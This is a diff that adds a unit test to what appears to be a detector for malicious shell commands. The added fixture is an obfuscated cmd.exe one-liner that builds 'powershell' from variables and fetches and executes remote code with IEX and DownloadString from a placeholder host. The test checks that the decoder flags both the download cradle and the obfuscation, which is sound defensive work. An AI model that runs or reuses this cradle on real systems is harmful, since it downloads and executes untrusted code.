@@ -44,4 +44,31 @@ describe('review battery — end state after Phase 1', () => {
     expect(r.signals.some((s) => s.id === 'download-cradle')).toBe(true)
     expect(r.signals.some((s) => s.id === 'clickfix')).toBe(false)
   })
+  it('#4 cmd set/%var% obfuscation: reassembles + re-enters to decode the inner download cradle, and the obfuscation itself is surfaced (Task 16/17, review 2.5)', async () => {
+    // Representative decoding form — genuinely reassembles + re-enters under
+    // the CURRENT cmd.exe-accurate quote/caret semantics. The review PDF's
+    // verbatim sample-4 wraps the whole /c body in one quote pair AND
+    // caret-escapes the word "set" itself (s^e^t); cmdlex.ts's
+    // deobfuscateCaret correctly suppresses caret processing inside "..."
+    // (real cmd.exe behavior), so under the current cmd-quote semantics those
+    // carets are never stripped and reassembly never fires for that exact
+    // text — a pre-existing cmdlex.ts quote-delimiter-stripping question
+    // (real cmd strips the /c "..." command-delimiter quotes before inner
+    // caret processing) deferred to the final-review backlog, out of scope
+    // for this task. This fixture drops the caret-escaping of "set" itself
+    // (quoting alone doesn't block reassembleCmdVars, which isn't
+    // quote-aware) so it exercises the same reassembly + re-entry + signal
+    // chain end to end.
+    const input = "cmd /c \"set x=power&&set y=shell&&%x%%y% -c IEX(New-Object Net.WebClient).DownloadString('http://x.test/a')\""
+    const r = await analyze(input)
+    // The inner cradle now decodes: cmd re-entry hops to powershell and the
+    // download-cradle signal fires on the reassembled inner command.
+    expect(r.layers.some((l) => l.transform.startsWith('cmd→powershell'))).toBe(true)
+    expect(r.signals.some((s) => s.id === 'download-cradle')).toBe(true)
+    expect(r.bullets.some((b) => b.text === 'Launches a PowerShell child process from cmd.exe')).toBe(true)
+    // The obfuscation ITSELF is surfaced even though reassembly resolved it —
+    // review 2.5's point: never silent, even on a construct that decoded.
+    expect(r.signals.some((s) => s.id === 'cmd-var-obfuscation')).toBe(true)
+    expect(r.bullets.some((b) => b.confidence === 'opaque' && b.text.includes('cmd variable-substitution obfuscation'))).toBe(true)
+  })
 })
